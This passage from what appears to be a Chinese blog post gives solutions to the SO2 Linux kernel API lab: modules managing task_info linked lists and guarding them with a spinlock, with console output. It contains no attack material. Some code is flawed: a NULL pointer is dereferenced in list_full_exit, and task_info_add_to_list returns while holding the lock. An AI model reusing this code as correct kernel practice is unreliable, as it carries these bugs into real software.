class="keyword">static</span> <span class="keyword">void</span> <span class="title">list_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	task_info_print_list(<span class="string">&quot;before exiting&quot;</span>);</span><br><span class="line">	task_info_purge_list();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(list_init);</span><br><span class="line">module_exit(list_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">4</span>-<span class="built_in">list</span><span class="meta"># insmod list.ko                          </span></span><br><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">4</span>-<span class="built_in">list</span><span class="meta"># rmmod list.ko                           </span></span><br><span class="line"><span class="number">216</span>:<span class="number">-48258</span>                                                                      </span><br><span class="line">before exiting: [                                                               </span><br><span class="line">(<span class="number">1</span>, <span class="number">4294930828</span>)                                                                 </span><br><span class="line">(<span class="number">0</span>, <span class="number">4294930828</span>)                                                                 </span><br><span class="line">(<span class="number">213</span>, <span class="number">4294930828</span>)                                                               </span><br><span class="line">(<span class="number">239</span>, <span class="number">4294930828</span>)                                                               </span><br><span class="line">]  </span><br></pre></td></tr></table></figure>
<p>5.Working with kernel lists for process handling：</p>
<ul>
<li>熟悉 Linux 链表的使用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kernel API lab</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * list-full.c: Working with lists (advanced)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Full list processing&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> timestamp;</span><br><span class="line">	<span class="keyword">atomic_t</span> count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">head</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_info *<span class="title">task_info_alloc</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	ti = kmalloc(<span class="keyword">sizeof</span>(*ti), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (ti == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	ti-&gt;pid = pid;</span><br><span class="line">	ti-&gt;timestamp = jiffies;</span><br><span class="line">	atomic_set(&amp;ti-&gt;count, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_info *<span class="title">task_info_find_pid</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Look for pid and return task_info or NULL if not found */</span></span><br><span class="line">	list_for_each(p, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		<span class="keyword">if</span>(ti-&gt;pid == pid)&#123;</span><br><span class="line">			<span class="keyword">return</span> ti;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_add_to_list</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	ti = task_info_find_pid(pid);</span><br><span class="line">	<span class="keyword">if</span> (ti != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		ti-&gt;timestamp = jiffies;</span><br><span class="line">		atomic_inc(&amp;ti-&gt;count);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ti = task_info_alloc(pid);</span><br><span class="line">	list_add(&amp;ti-&gt;<span class="built_in">list</span>, &amp;head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_add_for_current</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	task_info_add_to_list(current-&gt;pid);</span><br><span class="line">	task_info_add_to_list(current-&gt;parent-&gt;pid);</span><br><span class="line">	task_info_add_to_list(next_task(current)-&gt;pid);</span><br><span class="line">	task_info_add_to_list(next_task(next_task(current))-&gt;pid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_print_list</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;%s: [ &quot;</span>, msg);</span><br><span class="line">	list_for_each(p, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		pr_info(<span class="string">&quot;(%d, %lu) &quot;</span>, ti-&gt;pid, ti-&gt;timestamp);</span><br><span class="line">	&#125;</span><br><span class="line">	pr_info(<span class="string">&quot;]\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_remove_expired</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>, *<span class="title">q</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	list_for_each_safe(p, q, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		<span class="keyword">if</span> (jiffies - ti-&gt;timestamp &gt; <span class="number">3</span> * HZ &amp;&amp; atomic_read(&amp;ti-&gt;count) &lt; <span class="number">5</span>) &#123;</span><br><span class="line">			list_del(p);</span><br><span class="line">			kfree(ti);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_purge_list</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>, *<span class="title">q</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	list_for_each_safe(p, q, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		list_del(p);</span><br><span class="line">		kfree(ti);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">list_full_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	INIT_LIST_HEAD(&amp;head);</span><br><span class="line"></span><br><span class="line">	task_info_add_for_current();</span><br><span class="line">	task_info_print_list(<span class="string">&quot;after first add&quot;</span>);</span><br><span class="line"></span><br><span class="line">	set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">	schedule_timeout(<span class="number">5</span> * HZ);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">list_full_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: Ensure that at least one task is not deleted */</span></span><br><span class="line">	ti = task_info_find_pid(current-&gt;parent-&gt;pid);</span><br><span class="line">	<span class="keyword">if</span>(ti == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		printk(<span class="string">&quot;not find pid: %d&quot;</span>,ti-&gt;pid);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		printk(<span class="string">&quot;find pid: %d&quot;</span>,ti-&gt;pid);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	list_del(&amp;ti-&gt;<span class="built_in">list</span>);</span><br><span class="line">	task_info_remove_expired();</span><br><span class="line">	list_add(&amp;ti-&gt;<span class="built_in">list</span>, &amp;head);</span><br><span class="line">	task_info_print_list(<span class="string">&quot;after removing expired&quot;</span>);</span><br><span class="line">	task_info_purge_list();</span><br><span class="line">	task_info_remove_expired();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(list_full_init);</span><br><span class="line">module_exit(list_full_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">5</span>-<span class="built_in">list</span>-full<span class="meta"># insmod list-full.ko                </span></span><br><span class="line">list_full: loading out-of-tree <span class="keyword">module</span> taints kernel.                            </span><br><span class="line">after first add: [                                                              </span><br><span class="line">(<span class="number">1</span>, <span class="number">4294916763</span>)                                                                 </span><br><span class="line">(<span class="number">0</span>, <span class="number">4294916763</span>)                                                                 </span><br><span class="line">(<span class="number">213</span>, <span class="number">4294916763</span>)                                                               </span><br><span class="line">(<span class="number">238</span>, <span class="number">4294916763</span>)                                                               </span><br><span class="line">]                                                                               </span><br><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">5</span>-<span class="built_in">list</span>-full<span class="meta"># rmmod list-full.ko                 </span></span><br><span class="line">find pid: <span class="number">213</span>                                                                   </span><br><span class="line">after removing expired: [                                                       </span><br><span class="line">(<span class="number">213</span>, <span class="number">4294916763</span>)                                                               </span><br><span class="line">]  </span><br></pre></td></tr></table></figure>
<p>6.Synchronizing list work：</p>
<ul>
<li>熟悉 Linux 锁的使用</li>
<li>熟悉 Linux 符号的导出</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Linux API lab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * list-sync.c - Synchronize access to a list</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Full list processing with synchronization&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> timestamp;</span><br><span class="line">	<span class="keyword">atomic_t</span> count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">head</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO 1: you can use either a spinlock or rwlock, define it here */</span></span><br><span class="line">DEFINE_SPINLOCK(lock);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_info *<span class="title">task_info_alloc</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	ti = kmalloc(<span class="keyword">sizeof</span>(*ti), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (ti == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	ti-&gt;pid = pid;</span><br><span class="line">	ti-&gt;timestamp = jiffies;</span><br><span class="line">	atomic_set(&amp;ti-&gt;count, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_info *<span class="title">task_info_find_pid</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	list_for_each(p, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		<span class="keyword">if</span> (ti-&gt;pid == pid) &#123;</span><br><span class="line">			<span class="keyword">return</span> ti;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_add_to_list</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Protect list, is this read or write access? */</span></span><br><span class="line">	spin_lock(&amp;lock);</span><br><span class="line">	ti = task_info_find_pid(pid);</span><br><span class="line">	<span class="keyword">if</span> (ti != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		ti-&gt;timestamp = jiffies;</span><br><span class="line">		atomic_inc(&amp;ti-&gt;count);</span><br><span class="line">		<span class="comment">/* <span class="doctag">TODO:</span> Guess why this comment was added  here */</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;lock);</span><br><span class="line">	<span class="comment">/* TODO 1: critical section ends here */</span></span><br><span class="line"></span><br><span class="line">	ti = task_info_alloc(pid);</span><br><span class="line">	<span class="comment">/* TODO 1: protect list access, is this read or write access? */</span></span><br><span class="line">	spin_lock(&amp;lock);</span><br><span class="line">	list_add(&amp;ti-&gt;<span class="built_in">list</span>, &amp;head);</span><br><span class="line">	spin_unlock(&amp;lock);</span><br><span class="line">	<span class="comment">/* TODO 1: critical section ends here */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task_info_add_for_current</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	task_info_add_to_list(current-&gt;pid);</span><br><span class="line">	task_info_add_to_list(current-&gt;parent-&gt;pid);</span><br><span class="line">	task_info_add_to_list(next_task(current)-&gt;pid);</span><br><span class="line">	task_info_add_to_list(next_task(next_task(current))-&gt;pid);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(task_info_add_for_current);</span><br><span class="line"><span class="comment">/* TODO 2: Export the kernel symbol */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task_info_print_list</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;%s: [ &quot;</span>, msg);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Protect list, is this read or write access? */</span></span><br><span class="line">	spin_lock(&amp;lock);</span><br><span class="line">	list_for_each(p, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		pr_info(<span class="string">&quot;(%d, %lu) &quot;</span>, ti-&gt;pid, ti-&gt;timestamp);</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;lock);</span><br><span class="line">	<span class="comment">/* TODO 1: Critical section ends here */</span></span><br><span class="line">	pr_info(<span class="string">&quot;]\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(task_info_print_list);</span><br><span class="line"><span class="comment">/* TODO 2: Export the kernel symbol */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task_info_remove_expired</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>, *<span class="title">q</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Protect list, is this read or write access? */</span></span><br><span class="line">	spin_lock(&amp;lock);</span><br><span class="line">	list_for_each_safe(p, q, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		<span class="keyword">if</span> (jiffies - ti-&gt;timestamp &gt; <span class="number">3</span> * HZ &amp;&amp; atomic_read(&amp;ti-&gt;count) &lt; <span class="number">5</span>) &#123;</span><br><span class="line">			list_del(p);</span><br><span class="line">			kfree(ti);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;lock);</span><br><span class="line">	<span class="comment">/* TODO 1: Critical section ends here */</span></span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(task_info_remove_expired);</span><br><span class="line"><span class="comment">/* TODO 2: Export the kernel symbol */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_purge_list</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>, *<span class="title">q</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: 